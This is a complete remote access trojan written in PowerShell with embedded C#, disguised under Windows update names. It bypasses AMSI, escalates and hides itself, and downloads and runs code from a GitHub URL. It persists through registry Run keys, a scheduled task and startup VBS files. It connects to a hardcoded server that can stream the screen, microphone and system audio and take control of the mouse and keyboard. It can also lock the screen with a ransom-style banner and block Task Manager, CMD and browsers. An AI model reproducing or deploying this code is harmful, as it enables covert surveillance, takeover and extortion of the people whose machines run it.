$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

# Se estiver na tela normal, esconde e re-executa invisível
if ($args -notcontains "-silent") {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
        exit
    }

    $dir = "$env:ProgramData\Microsoft\Windows\Caches"
    New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
    try { (New-Object Net.WebClient).DownloadFile($myUrl, "$dir\$installName.ps1") } catch {}
    
    $argList = "-nop -w hidden -ep bypass -f `"$dir\$installName.ps1`" -silent"
    $cmd = "powershell.exe $argList"
    
    try {
        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argList
        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
    } catch {}

    # Inicia escondido e sai
    Start-Process powershell.exe -ArgumentList $argList -WindowStyle Hidden
    exit
}

# MODO INVISÍVEL
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}

$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }

if (-not ("R9KAgent" -as [type])) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;
    using Microsoft.Win32;
    using System.Diagnostics;
    using System.Net;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
        
        [DllImport("winmm.dll")] static extern int waveInOpen(out IntPtr phwi, int uDeviceID, ref WAVEFORMATEX pwfx, WaveCallback dwCallback, IntPtr dwInstance, uint fdwOpen);
        [DllImport("winmm.dll")] static extern int waveInPrepareHeader(IntPtr hwi, IntPtr pwh, int cbwh);
        [DllImport("winmm.dll")] static extern int waveInUnprepareHeader(IntPtr hwi, IntPtr pwh, int cbwh);
        [DllImport("winmm.dll")] static extern int waveInAddBuffer(IntPtr hwi, IntPtr pwh, int cbwh);
        [DllImport("winmm.dll")] static extern int waveInStart(IntPtr hwi);
        [DllImport("winmm.dll")] static extern int waveInStop(IntPtr hwi);
        [DllImport("winmm.dll")] static extern int waveInClose(IntPtr hwi);

        [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
        [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDeviceEnumerator {
            int NotImpl1();
            int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
        }
        [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDevice {
            int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface);
        }
        [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioClient {
            int Initialize(int shareMode, int streamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
            int GetBufferSize(out uint pNumBufferFrames);
            int GetStreamLatency(out long phnsLatency);
            int GetCurrentPadding(out uint pNumPaddingFrames);
            int IsFormatSupported(int shareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
            int GetMixFormat(out IntPtr ppDeviceFormat);
            int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
            int Start();
            int Stop();
            int Reset();
            int SetEventHandle(IntPtr eventHandle);
            int GetService(ref Guid riid, out IAudioCaptureClient ppv);
        }
        [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioCaptureClient {
            int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
            int ReleaseBuffer(uint NumFramesRead);
            int GetNextPacketSize(out uint pNumFramesInNextPacket);
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct WAVEFORMATEX {
            public ushort wFormatTag;
            public ushort nChannels;
            public uint nSamplesPerSec;
            public uint nAvgBytesPerSec;
            public ushort nBlockAlign;
            public ushort wBitsPerSample;
            public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEHDR {
            public IntPtr lpData;
            public int dwBufferLength;
            public int dwBytesRecorded;
            public IntPtr dwUser;
            public int dwFlags;
            public int dwLoops;
            public IntPtr lpNext;
            public IntPtr reserved;
        }

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WaveCallback(IntPtr hwi, uint uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2);

        static string IP;
        static int PORT;
        static bool streaming = false;
        static bool isMicRunning = false;
        static bool isSysRunning = false;
        static object writeLock = new object();
        static bool isLocked = false;
        static int targetX = 0, targetY = 0;
        static bool hasNewPos = false;
        
        static Form bannerForm = null;
        static Thread bannerThread = null;
        static StreamWriter globalWriter = null;

        static Bitmap reuseBmp = null;
        static Graphics reuseGfx = null;
        static ImageCodecInfo jpgCodec = null;
        static EncoderParameters jpgParams = null;

        static IntPtr hMic = IntPtr.Zero;
        static IntPtr[] micHeaders = new IntPtr[2];
        static IntPtr[] micBuffers = new IntPtr[2];
        static WaveCallback micCallback = new WaveCallback(MicCallback);

        static IAudioClient audioClient = null;
        static IAudioCaptureClient captureClient = null;
        static WAVEFORMATEX sysFormat = new WAVEFORMATEX();

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            try { SetProcessDPIAware(); } catch {}
            
            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();

            while (true) {
                TcpClient myClient = null;
                try {
                    myClient = new TcpClient();
                    myClient.Connect(IP, PORT);
                    myClient.NoDelay = true;
                    NetworkStream myStream = myClient.GetStream();
                    StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                    StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                    myWriter.AutoFlush = true;
                    globalWriter = myWriter;

                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");

                    Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();

                    while (myClient.Connected) { Thread.Sleep(500); }
                } catch { 
                    Thread.Sleep(3000); 
                } finally {
                    streaming = false;
                    globalWriter = null;
                    try { if (myClient != null) myClient.Close(); } catch {}
                }
            }
        }

        static void WatchdogLoop() {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
            string scriptPath = dir + @"\WinUpdateSvc.ps1";
            string vbsPath = dir + @"\WinUpdateSvc.vbs";
            
            while (true) {
                try {
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    if (!File.Exists(scriptPath)) {
                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                    }
                    if (!File.Exists(vbsPath)) {
                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
                        File.WriteAllText(vbsPath, vbs);
                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                    }
                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                    }
                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                        if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                    }
                    string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                    if (!File.Exists(startupVbs)) {
                        try { File.Copy(vbsPath, startupVbs, true); File.SetAttributes(startupVbs, FileAttributes.Hidden | FileAttributes.System); } catch {}
                    }
                } catch {}
                Thread.Sleep(5000);
            }
        }

        static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
            try {
                while (myClient.Connected) {
                    string cmd = myReader.ReadLine();
                    if (cmd == null) { streaming = false; break; }
                    ProcessCommand(cmd.Trim(), myWriter);
                }
            } catch { streaming = false; }
            try { myClient.Close(); } catch {}
        }

        static void InputLoop() {
            while (true) {
                try {
                    if (isLocked) {
                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) { Cursor.Position = new Point(targetX, targetY); }
                    } else {
                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                    }
                } catch {}
                Thread.Sleep(1);
            }
        }

        static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
            while (myClient.Connected) {
                try {
                    if (streaming && myClient.Connected) {
                        string b64 = CaptureScreen(1280, 35);
                        if (b64 != null) {
                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
                            Thread.Sleep(20);
                        } else {
                            Thread.Sleep(100);
                        }
                    } else { 
                        streaming = false;
                        Thread.Sleep(50); 
                    }
                } catch { 
                    streaming = false;
                    try { myClient.Close(); } catch {}
                    break;
                }
            }
        }

        static void ProcessCommand(string cmd, StreamWriter myWriter) {
            try {
                if (cmd == "stream_start") { streaming = true; return; }
                if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                
                if (cmd == "mic_start" && !isMicRunning) {
                    isMicRunning = true;
                    Thread t = new Thread(StartMic); 
                    t.SetApartmentState(ApartmentState.MTA);
                    t.IsBackground = true; 
                    t.Start();
                    return;
                }
                if (cmd == "mic_stop") { 
                    isMicRunning = false; 
                    if (hMic != IntPtr.Zero) { waveInStop(hMic); waveInClose(hMic); hMic = IntPtr.Zero; }
                    return; 
                }
                
                if (cmd == "sys_start" && !isSysRunning) {
                    isSysRunning = true;
                    Thread t = new Thread(StartSystemAudio); 
                    t.SetApartmentState(ApartmentState.STA); 
                    t.IsBackground = true; 
                    t.Start();
                    return;
                }
                if (cmd == "sys_stop") { 
                    isSysRunning = false; 
                    if (audioClient != null) { audioClient.Stop(); audioClient = null; }
                    return; 
                }

                if (cmd == "reinstall") {
                    string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                    try {
                        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"");
                        psi.WindowStyle = ProcessWindowStyle.Hidden;
                        psi.CreateNoWindow = true;
                        Process.Start(psi);
                    } catch {}
                    Environment.Exit(0); 
                }

                if (cmd == "banner_on") {
                    BlockInput(true);
                    bannerThread = new Thread(() => {
                        try {
                            Image bgImg = null;
                            try {
                                using (var wc = new WebClient()) {
                                    wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                                    byte[] imgBytes = wc.DownloadData("https://i.imgur.com/gx1MwjP.jpeg");
                                    using (MemoryStream ms = new MemoryStream(imgBytes)) {
                                        bgImg = Image.FromStream(ms);
                                    }
                                }
                            } catch {}

                            bannerForm = new Form();
                            bannerForm.FormBorderStyle = FormBorderStyle.None;
                            bannerForm.WindowState = FormWindowState.Maximized;
                            bannerForm.TopMost = true;
                            bannerForm.ShowInTaskbar = false;
                            bannerForm.BackColor = Color.Black;
                            
                            if (bgImg != null) {
                                bannerForm.BackgroundImage = bgImg;
                                bannerForm.BackgroundImageLayout = ImageLayout.Stretch;
                            } else {
                                bannerForm.Controls.Add(new Label { Text = "SISTEMA BLOQUEADO", ForeColor = Color.Red, Font = new Font("Arial", 48), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter });
                            }
                            
                            bannerForm.KeyPreview = true;
                            bannerForm.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
                            Application.Run(bannerForm);
                        } catch {}
                    });
                    bannerThread.SetApartmentState(ApartmentState.STA);
                    bannerThread.IsBackground = true;
                    bannerThread.Start();
                    lock(writeLock) { myWriter.WriteLine("BANNER_ON"); }
                    return;
                }

                if (cmd == "banner_off") {
                    BlockInput(false);
                    if (bannerForm != null) {
                        try { bannerForm.BeginInvoke(new Action(() => bannerForm.Close())); } catch {}
                        bannerForm = null;
                    }
                    if (bannerThread != null) { bannerThread.Abort(); bannerThread = null; }
                    lock(writeLock) { myWriter.WriteLine("BANNER_OFF"); }
                    return;
                }

                if (cmd == "uninstall") { 
                    BlockInput(false); 
                    UnblockAllApps();
                    try {
                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
                        string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                        string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
                        if (File.Exists(startupVbs)) { File.SetAttributes(startupVbs, FileAttributes.Normal); File.Delete(startupVbs); }
                        
                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
                    } catch {}
                    Environment.Exit(0); 
                }
                
                if (cmd == "block_apps") { BlockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_BLOQUEADOS"); } return; }
                if (cmd == "unblock_apps") { UnblockAllApps(); lock(writeLock) { myWriter.WriteLine("APPS_DESBLOQUEADOS"); } return; }

                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
                if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }

                if (cmd.StartsWith("move ")) {
                    string[] p = cmd.Split(' ');
                    targetX = int.Parse(p[1]);
                    targetY = int.Parse(p[2]);
                    hasNewPos = true; 
                }
                else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
                else if (cmd == "md 2") mouse_event(0x0008, 0, 0, 0, 0);
                else if (cmd == "mu 2") mouse_event(0x0010, 0, 0, 0, 0);
                else if (cmd == "md 3") mouse_event(0x0020, 0, 0, 0, 0);
                else if (cmd == "mu 3") mouse_event(0x0040, 0, 0, 0, 0);
                else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
            } catch {}
        }

        static void StartMic() {
            try {
                WAVEFORMATEX wfx = new WAVEFORMATEX();
                wfx.wFormatTag = 1; // PCM
                wfx.nChannels = 1;
                wfx.nSamplesPerSec = 16000;
                wfx.wBitsPerSample = 16;
                wfx.nBlockAlign = (ushort)(wfx.nChannels * wfx.wBitsPerSample / 8);
                wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
                wfx.cbSize = 0;

                if (waveInOpen(out hMic, 0, ref wfx, micCallback, IntPtr.Zero, 0x00030000) != 0) return; 
                
                for (int i = 0; i < 2; i++) {
                    micHeaders[i] = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WAVEHDR)));
                    micBuffers[i] = Marshal.AllocHGlobal(6400); 

                    WAVEHDR hdr = new WAVEHDR();
                    hdr.lpData = micBuffers[i];
                    hdr.dwBufferLength = 6400;
                    Marshal.StructureToPtr(hdr, micHeaders[i], false);

                    waveInPrepareHeader(hMic, micHeaders[i], Marshal.SizeOf(typeof(WAVEHDR)));
                    waveInAddBuffer(hMic, micHeaders[i], Marshal.SizeOf(typeof(WAVEHDR)));
                }
                waveInStart(hMic);
            } catch {}
        }

        static void MicCallback(IntPtr hwi, uint uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2) {
            if (uMsg == 0x3C0) { // WIM_DATA
                if (globalWriter != null && isMicRunning) {
                    try {
                        WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(dwParam1, typeof(WAVEHDR));
                        byte[] buf = new byte[hdr.dwBufferLength];
                        Marshal.Copy(hdr.lpData, buf, 0, hdr.dwBufferLength);
                        lock (writeLock) { globalWriter.WriteLine("MIC:" + Convert.ToBase64String(buf)); }
                    } catch {}
                }
                if (isMicRunning) waveInAddBuffer(hwi, dwParam1, Marshal.SizeOf(typeof(WAVEHDR)));
            }
        }

        static void StartSystemAudio() {
            try {
                IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                IMMDevice device;
                enumerator.GetDefaultAudioEndpoint(0, 1, out device); 
                
                Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient); 
                
                IntPtr pFormat;
                audioClient.GetMixFormat(out pFormat);
                sysFormat = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
                
                audioClient.Initialize(0, 0x00080000, 10000000, 10000000, pFormat, IntPtr.Zero); 
                
                Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
                
                audioClient.Start();
                
                while (isSysRunning && globalWriter != null) {
                    Thread.Sleep(50);
                    uint packetSize;
                    captureClient.GetNextPacketSize(out packetSize);
                    while (packetSize > 0 && isSysRunning) {
                        IntPtr pData;
                        uint numFrames;
                        uint flags;
                        ulong pos, qpc;
                        captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
                        
                        if (numFrames > 0) {
                            int bytes = (int)(numFrames * sysFormat.nBlockAlign);
                            byte[] buffer = new byte[bytes];
                            Marshal.Copy(pData, buffer, 0, bytes);
                            
                            if (sysFormat.wFormatTag == 3) { 
                                byte[] pcm16 = new byte[bytes / 2];
                                for (int i = 0; i < bytes / 4; i++) {
                                    float f = BitConverter.ToSingle(buffer, i * 4);
                                    short s = (short)(f * 32767.0f);
                                    pcm16[i * 2] = (byte)(s & 0xFF);
                                    pcm16[i * 2 + 1] = (byte)((s >> 8) & 0xFF);
                                }
                                buffer = pcm16;
                            }
                            
                            lock (writeLock) {
                                if (globalWriter != null) globalWriter.WriteLine("SYS:" + Convert.ToBase64String(buffer));
                            }
                        }
                        captureClient.ReleaseBuffer(numFrames);
                        captureClient.GetNextPacketSize(out packetSize);
                    }
                }
                audioClient.Stop();
            } catch {}
        }

        static void BlockAllApps() {
            try { Process.Start("taskkill", "/F /IM explorer.exe").WaitForExit(); } catch {}
            string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave" };
            foreach(var b in browsers) { try { Process.Start("taskkill", "/F /IM " + b + ".exe").WaitForExit(); } catch {} }

            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")) {
                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                key.SetValue("NoRun", 1, RegistryValueKind.DWord);
                key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System")) {
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System")) {
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System")) {
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }

            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
            foreach (var app in apps) {
                try {
                    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) {
                        key.SetValue("Debugger", "svchost.exe");
                    }
                } catch {}
            }
        }

        static void UnblockAllApps() {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true)) {
                if (key != null) {
                    key.DeleteValue("NoViewOnDrive", false);
                    key.DeleteValue("NoRun", false);
                    key.DeleteValue("NoDesktop", false);
                }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
                if (key != null) {
                    key.DeleteValue("DisableTaskMgr", false);
                    key.DeleteValue("DisableRegistryTools", false);
                }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true)) {
                if (key != null) key.DeleteValue("DisableCMD", false);
            }
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true)) {
                if (key != null) key.DeleteValue("DisableCMD", false);
            }

            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
            foreach (var app in apps) {
                try { Registry.LocalMachine.DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app, false); } catch {}
            }

            try { Process.Start("explorer.exe"); } catch {}
        }

        static string CaptureScreen(int maxW, long quality) {
            try {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                
                if (reuseBmp == null || reuseBmp.Width != bounds.Width || reuseBmp.Height != bounds.Height) {
                    if (reuseGfx != null) reuseGfx.Dispose();
                    if (reuseBmp != null) reuseBmp.Dispose();
                    reuseBmp = new Bitmap(bounds.Width, bounds.Height);
                    reuseGfx = Graphics.FromImage(reuseBmp);
                }
                
                reuseGfx.CopyFromScreen(0, 0, 0, 0, bounds.Size);
                
                Bitmap finalBmp = reuseBmp;
                if (maxW > 0 && reuseBmp.Width > maxW) {
                    int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
                    finalBmp = new Bitmap(newW, newH);
                    using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                        g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                        g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                    }
                }
                
                using (MemoryStream ms = new MemoryStream()) {
                    if (jpgCodec == null) {
                        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
                        jpgParams = new EncoderParameters(1);
                        jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                    }
                    finalBmp.Save(ms, jpgCodec, jpgParams);
                    if (finalBmp != reuseBmp) finalBmp.Dispose();
                    return Convert.ToBase64String(ms.ToArray());
                }
            } catch { return null; }
        }
    }
"@
}

[R9KAgent]::Start($serverIP, $serverPort)
